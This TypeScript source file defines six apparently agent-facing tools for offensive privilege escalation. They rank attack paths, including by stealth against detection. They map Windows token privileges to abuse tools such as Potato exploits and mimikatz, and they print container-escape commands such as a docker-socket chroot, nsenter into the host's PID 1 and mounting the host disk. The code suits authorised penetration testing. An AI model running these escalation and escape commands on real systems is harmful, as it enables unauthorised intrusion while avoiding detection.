import { z } from "zod";
import type { ToolDef, ToolContext, ToolResult } from "../types/index.js";
import { json, text } from "../types/index.js";
import { buildAttackGraph } from "../graph/builder.js";
import { shortestPath, allPaths, discoverChains } from "../graph/pathfinder.js";
import { scorePath, rankPaths } from "../graph/scorer.js";
import type { EnvironmentModel } from "../schema/environment.js";
import type { AttackPath } from "../schema/graph.js";

function lookupSession(
  envId: string,
  ctx: ToolContext,
): EnvironmentModel | null {
  return ctx.sessions.get(envId) ?? null;
}

function sessionNotFound(envId: string): ToolResult {
  return text(
    `Session not found for environment_id "${envId}". ` +
      "Run a parse_*_enum tool first to create an environment session.",
  );
}

function serializePath(p: AttackPath): Record<string, unknown> {
  return {
    rank: p.rank,
    name: p.name,
    steps: p.steps.map((s) => ({
      action: s.action,
      binary: s.binary,
      command: s.result,
      attck: s.attck,
      stealth_score: s.stealthScore,
      catalog: s.sourceCatalog,
    })),
    total_stealth: p.totalStealth,
    certainty: p.certainty,
    impact: p.impact,
    score: p.score,
    reasoning: p.chainReasoning,
    is_chain: p.isChain,
  };
}

function getPrivilegeTarget(platform: string): string {
  if (platform === "windows") return "system";
  return "root"; // linux, macos
}

const escalation_single_step: ToolDef = {
  name: "escalation_single_step",
  description:
    "Find direct one-step privilege escalation paths from the parsed environment",
  schema: {
    environment_id: z
      .string()
      .describe("Environment session ID returned by a parse_*_enum tool"),
    target: z
      .string()
      .optional()
      .describe(
        "Target privilege node (e.g. 'root', 'system', 'administrator'); auto-detected if omitted",
      ),
    limit: z
      .number()
      .optional()
      .default(10)
      .describe("Maximum number of paths to return"),
  },
  async execute(args: any, ctx: ToolContext): Promise<ToolResult> {
    const model = lookupSession(args.environment_id, ctx);
    if (!model) return sessionNotFound(args.environment_id);

    const graph = buildAttackGraph(model);
    const target =
      args.target || getPrivilegeTarget(model.state.platform);

    // Find all paths with maxDepth=2 (current-user → binary → target = 2 edges = 1 step conceptually)
    const paths = allPaths(graph, "current-user", target, 2);

    // Score and rank
    const ranked = rankPaths(paths, undefined, model.state);
    const limited = ranked.slice(0, args.limit || 10);

    return json({
      environment_id: model.id,
      target,
      total_found: paths.length,
      paths: limited.map(serializePath),
    });
  },
};

const escalation_multi_step: ToolDef = {
  name: "escalation_multi_step",
  description:
    "Find multi-step privilege escalation chains (2+ steps) from the parsed environment",
  schema: {
    environment_id: z
      .string()
      .describe("Environment session ID returned by a parse_*_enum tool"),
    target: z
      .string()
      .optional()
      .describe(
        "Target privilege node (e.g. 'root', 'system'); auto-detected if omitted",
      ),
    max_depth: z
      .number()
      .optional()
      .default(4)
      .describe("Maximum chain depth (number of edges to traverse)"),
    limit: z
      .number()
      .optional()
      .default(10)
      .describe("Maximum number of paths to return"),
  },
  async execute(args: any, ctx: ToolContext): Promise<ToolResult> {
    const model = lookupSession(args.environment_id, ctx);
    if (!model) return sessionNotFound(args.environment_id);

    const graph = buildAttackGraph(model);
    const target =
      args.target || getPrivilegeTarget(model.state.platform);
    const maxDepth = args.max_depth || 4;

    const paths = allPaths(graph, "current-user", target, maxDepth);

    // Filter to multi-step only (more than 2 edges)
    const multiStep = paths.filter((p) => p.steps.length > 2);

    const ranked = rankPaths(multiStep, undefined, model.state);
    const limited = ranked.slice(0, args.limit || 10);

    return json({
      environment_id: model.id,
      target,
      max_depth: maxDepth,
      total_found: multiStep.length,
      paths: limited.map(serializePath),
    });
  },
};

const escalation_rank: ToolDef = {
  name: "escalation_rank",
  description:
    "Rank all discovered escalation paths by multi-objective score (certainty, stealth, brevity, impact)",
  schema: {
    environment_id: z
      .string()
      .describe("Environment session ID returned by a parse_*_enum tool"),
    target: z
      .string()
      .optional()
      .describe("Target privilege node; auto-detected if omitted"),
    max_depth: z
      .number()
      .optional()
      .default(4)
      .describe("Maximum chain depth"),
    weight_certainty: z
      .number()
      .optional()
      .default(0.4)
      .describe("Scoring weight for certainty (0-1)"),
    weight_stealth: z
      .number()
      .optional()
      .default(0.3)
      .describe("Scoring weight for stealth (0-1)"),
    weight_brevity: z
      .number()
      .optional()
      .default(0.1)
      .describe("Scoring weight for brevity (0-1)"),
    weight_impact: z
      .number()
      .optional()
      .default(0.2)
      .describe("Scoring weight for impact (0-1)"),
    limit: z
      .number()
      .optional()
      .default(15)
      .describe("Maximum number of ranked paths to return"),
  },
  async execute(args: any, ctx: ToolContext): Promise<ToolResult> {
    const model = lookupSession(args.environment_id, ctx);
    if (!model) return sessionNotFound(args.environment_id);

    const graph = buildAttackGraph(model);
    const target =
      args.target || getPrivilegeTarget(model.state.platform);
    const maxDepth = args.max_depth || 4;

    const paths = allPaths(graph, "current-user", target, maxDepth);

    const weights = {
      certainty: args.weight_certainty ?? 0.4,
      stealth: args.weight_stealth ?? 0.3,
      brevity: args.weight_brevity ?? 0.1,
      impact: args.weight_impact ?? 0.2,
    };

    const ranked = rankPaths(paths, weights, model.state);
    const limited = ranked.slice(0, args.limit || 15);

    return json({
      environment_id: model.id,
      target,
      weights,
      total_found: paths.length,
      paths: limited.map(serializePath),
    });
  },
};

const escalation_stealth_optimal: ToolDef = {
  name: "escalation_stealth_optimal",
  description:
    "Find the stealthiest path to the target privilege level, optimizing for minimal detection",
  schema: {
    environment_id: z
      .string()
      .describe("Environment session ID returned by a parse_*_enum tool"),
    target: z
      .string()
      .optional()
      .describe("Target privilege node; auto-detected if omitted"),
    max_depth: z
      .number()
      .optional()
      .default(5)
      .describe("Maximum chain depth to search"),
    min_certainty: z
      .number()
      .optional()
      .default(0.3)
      .describe("Minimum certainty threshold (0-1); discard paths below this"),
  },
  async execute(args: any, ctx: ToolContext): Promise<ToolResult> {
    const model = lookupSession(args.environment_id, ctx);
    if (!model) return sessionNotFound(args.environment_id);

    const graph = buildAttackGraph(model);
    const target =
      args.target || getPrivilegeTarget(model.state.platform);
    const maxDepth = args.max_depth || 5;
    const minCertainty = args.min_certainty ?? 0.3;

    const paths = allPaths(graph, "current-user", target, maxDepth);

    // Stealth-heavy weights
    const stealthWeights = {
      certainty: 0.15,
      stealth: 0.6,
      brevity: 0.05,
      impact: 0.2,
    };

    const ranked = rankPaths(paths, stealthWeights, model.state);

    // Filter by minimum certainty
    const filtered = ranked.filter((p) => p.certainty >= minCertainty);

    const top = filtered.slice(0, 5);

    return json({
      environment_id: model.id,
      target,
      optimization: "stealth",
      min_certainty: minCertainty,
      total_candidates: paths.length,
      total_after_filter: filtered.length,
      paths: top.map(serializePath),
      recommendation:
        top.length > 0
          ? `Best stealth path: "${top[0].name}" (stealth=${top[0].totalStealth}, certainty=${top[0].certainty})`
          : "No paths found meeting the minimum certainty threshold.",
    });
  },
};

const escalation_token_manipulation: ToolDef = {
  name: "escalation_token_manipulation",
  description:
    "Analyze Windows token privileges (SeImpersonate, SeDebug, SeBackup, etc.) and find token-based escalation techniques",
  schema: {
    environment_id: z
      .string()
      .describe("Environment session ID returned by parse_windows_enum"),
    privileges: z
      .array(z.string())
      .optional()
      .describe(
        "Override token privileges to analyze; if omitted uses privileges from the parsed environment",
      ),
  },
  async execute(args: any, ctx: ToolContext): Promise<ToolResult> {
    const model = lookupSession(args.environment_id, ctx);
    if (!model) return sessionNotFound(args.environment_id);

    if (model.state.platform !== "windows") {
      return text(
        "Token manipulation analysis is only applicable to Windows environments. " +
          `Current platform: ${model.state.platform}`,
      );
    }

    const privileges: string[] =
      args.privileges ?? model.state.tokenPrivileges;

    if (privileges.length === 0) {
      return text(
        "No token privileges found in the environment. Ensure whoami /priv output is included in the enumeration.",
      );
    }

    // Categorize privileges by abuse potential
    const dangerousPrivileges: Record<
      string,
      { risk: string; technique: string; tools: string[] }
    > = {
      SeImpersonatePrivilege: {
        risk: "critical",
        technique: "Token impersonation (Potato attacks)",
        tools: ["JuicyPotato", "PrintSpoofer", "GodPotato", "SweetPotato"],
      },
      SeAssignPrimaryTokenPrivilege: {
        risk: "critical",
        technique: "Token assignment to spawn SYSTEM process",
        tools: ["JuicyPotato", "RoguePotato"],
      },
      SeDebugPrivilege: {
        risk: "critical",
        technique: "Debug any process, inject into SYSTEM processes",
        tools: ["mimikatz", "procdump", "custom injector"],
      },
      SeBackupPrivilege: {
        risk: "high",
        technique: "Read any file (SAM, SYSTEM hive) via backup semantics",
        tools: ["robocopy", "wbadmin", "diskshadow"],
      },
      SeRestorePrivilege: {
        risk: "high",
        technique: "Write to any file, replace service binaries",
        tools: ["robocopy /B", "custom DLL"],
      },
      SeLoadDriverPrivilege: {
        risk: "critical",
        technique: "Load vulnerable kernel driver for privilege escalation",
        tools: ["Capcom.sys", "DriverLoader"],
      },
      SeTakeOwnershipPrivilege: {
        risk: "high",
        technique: "Take ownership of protected files and registry keys",
        tools: ["takeown", "icacls"],
      },
      SeManageVolumePrivilege: {
        risk: "medium",
        technique: "Access raw disk, read sensitive files",
        tools: ["CreateFileW with volume access"],
      },
      SeTcbPrivilege: {
        risk: "critical",
        technique: "Act as part of the operating system (create any token)",
        tools: ["Custom token creation"],
      },
      SeCreateTokenPrivilege: {
        risk: "critical",
        technique: "Create arbitrary tokens with any privilege",
        tools: ["NtCreateToken"],
      },
    };

    const findings = privileges.map((priv) => {
      const info = dangerousPrivileges[priv];
      return {
        privilege: priv,
        abusable: !!info,
        ...(info || { risk: "low", technique: "No known direct abuse", tools: [] }),
      };
    });

    const abusable = findings.filter((f) => f.abusable);

    // Also find matching KB entries for token-based escalation
    const tokenEntries = model.matchedEntries.filter(
      (m) =>
        m.entry.functions.includes("privilege_escalation") &&
        m.applicableContexts.some(
          (c) => c.context === "admin" || c.context === "system",
        ),
    );

    return json({
      environment_id: model.id,
      platform: "windows",
      total_privileges: privileges.length,
      abusable_count: abusable.length,
      findings,
      matched_kb_entries: tokenEntries.slice(0, 10).map((m) => ({
        binary: m.entry.binary,
        functions: m.entry.functions,
        reason: m.matchReason,
        contexts: m.applicableContexts.map((c) => ({
          context: c.context,
          command: c.command,
        })),
      })),
      recommendation:
        abusable.length > 0
          ? `Found ${abusable.length} abusable privilege(s). Highest risk: ${abusable[0].privilege} (${abusable[0].risk}).`
          : "No directly abusable token privileges found.",
    });
  },
};

const escalation_docker_escape: ToolDef = {
  name: "escalation_docker_escape",
  description:
    "Analyze Docker/container escape opportunities from the parsed environment",
  schema: {
    environment_id: z
      .string()
      .describe("Environment session ID returned by a parse_*_enum tool"),
    container_info: z
      .string()
      .optional()
      .describe(
        "Additional container enumeration output (mount, capsh --print, cat /proc/1/cgroup, etc.)",
      ),
  },
  async execute(args: any, ctx: ToolContext): Promise<ToolResult> {
    const model = lookupSession(args.environment_id, ctx);
    if (!model) return sessionNotFound(args.environment_id);

    const state = model.state;
    const escapeVectors: Array<{
      technique: string;
      description: string;
      risk: string;
      command: string;
      attck: string[];
    }> = [];

    // 1. Docker socket mounted
    if (state.dockerSocket) {
      escapeVectors.push({
        technique: "Docker Socket Mount",
        description:
          "Docker socket (/var/run/docker.sock) is accessible. Can create privileged container and mount host filesystem.",
        risk: "critical",
        command:
          'docker run -v /:/host --privileged -it alpine chroot /host /bin/bash',
        attck: ["T1611"],
      });
    }

    // 2. Privileged container indicators
    const hasCapSysAdmin = state.capabilities.some((c) =>
      c.capabilities.some(
        (cap) =>
          cap.toLowerCase().includes("cap_sys_admin") ||
          cap.toLowerCase().includes("sys_admin"),
      ),
    );
    if (hasCapSysAdmin) {
      escapeVectors.push({
        technique: "CAP_SYS_ADMIN Abuse",
        description:
          "CAP_SYS_ADMIN capability allows mounting host filesystems and cgroup manipulation.",
        risk: "critical",
        command:
          "mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && ...",
        attck: ["T1611"],
      });
    }

    // 3. Writable cgroup paths
    const cgroupWritable = state.writablePaths.some(
      (p) => p.includes("cgroup") || p.includes("/sys/fs/"),
    );
    if (cgroupWritable) {
      escapeVectors.push({
        technique: "Cgroup Escape (notify_on_release)",
        description:
          "Writable cgroup paths detected. Can abuse notify_on_release to execute on host.",
        risk: "high",
        command: 'echo 1 > /tmp/cgrp/x/notify_on_release && echo "#!/bin/sh" > /cmd && ...',
        attck: ["T1611"],
      });
    }

    // 4. /proc/sysrq-trigger or host /proc mount
    const hasProcAccess = state.sensitiveFiles.some(
      (f) =>
        (f.path.includes("/proc/sysrq") || f.path.includes("/proc/1/root")) &&
        f.writable,
    );
    if (hasProcAccess) {
      escapeVectors.push({
        technique: "Host /proc Access",
        description:
          "Host procfs is accessible from container. Can access host process namespace.",
        risk: "critical",
        command: "nsenter --target 1 --mount --uts --ipc --net --pid -- /bin/bash",
        attck: ["T1611"],
      });
    }

    // 5. Check for known container escape binaries in KB
    const escapeKeywords = ["docker", "container", "escape", "namespace", "cgroup"];
    const kbEscapes = model.matchedEntries.filter((m) =>
      escapeKeywords.some(
        (kw) =>
          m.entry.description.toLowerCase().includes(kw) ||
          m.entry.binary.toLowerCase().includes(kw),
      ),
    );

    // 6. Parse additional container info if provided
    if (args.container_info) {
      const info = args.container_info as string;

      if (info.includes("--privileged") || info.includes("privileged: true")) {
        escapeVectors.push({
          technique: "Privileged Container",
          description:
            "Container is running in privileged mode. Full host device access available.",
          risk: "critical",
          command: "mount /dev/sda1 /mnt && chroot /mnt /bin/bash",
          attck: ["T1611"],
        });
      }

      if (info.includes("hostPID") || info.includes("pid: host")) {
        escapeVectors.push({
          technique: "Host PID Namespace",
          description:
            "Container shares host PID namespace. Can interact with host processes.",
          risk: "high",
          command: "nsenter --target 1 --mount -- /bin/bash",
          attck: ["T1611"],
        });
      }

      if (info.includes("hostNetwork") || info.includes("network: host")) {
        escapeVectors.push({
          technique: "Host Network Namespace",
          description:
            "Container shares host network namespace. Can sniff host traffic and bind to host ports.",
          risk: "medium",
          command: "tcpdump -i any or ss -tlnp",
          attck: ["T1040"],
        });
      }
    }

    return json({
      environment_id: model.id,
      platform: state.platform,
      docker_socket_accessible: state.dockerSocket,
      total_escape_vectors: escapeVectors.length,
      escape_vectors: escapeVectors,
      related_kb_entries: kbEscapes.slice(0, 5).map((m) => ({
        binary: m.entry.binary,
        description: m.entry.description,
        functions: m.entry.functions,
        reason: m.matchReason,
      })),
      recommendation:
        escapeVectors.length > 0
          ? `Found ${escapeVectors.length} potential container escape vector(s). ` +
            `Highest risk: ${escapeVectors[0].technique} (${escapeVectors[0].risk}).`
          : "No obvious container escape vectors detected from the parsed environment data.",
    });
  },
};

export const escalationTools: ToolDef[] = [
  escalation_single_step,
  escalation_multi_step,
  escalation_rank,
  escalation_stealth_optimal,
  escalation_token_manipulation,
  escalation_docker_escape,
];
